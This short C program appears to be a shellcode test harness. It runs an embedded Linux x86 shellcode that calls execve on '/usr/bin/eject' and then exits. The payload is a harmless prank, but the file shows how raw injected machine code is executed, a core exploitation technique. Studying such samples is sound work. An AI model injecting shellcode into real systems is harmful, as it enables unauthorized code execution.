#include<stdio.h>
#include<string.h>
unsigned char code[] = \
"\x31\xc0\xb0\x0b\x51\x68\x6a\x65\x63\x74\x68\x6e\x2f\x2f\x65\x68\x72\x2f\x62\x69\x68\x2f\x2f\x75\x73\x89\xe3\x51\x53\x89\xe1\xcd\x80\x04\x01\xcd\x80"
;
main()
{
	printf("Press ENTER key to Continue\n");
	getchar();
	printf("Payload shellcode Lenght: %d\n", strlen(code));
	int (*ret)() = (int(*)())code;

	ret();

}
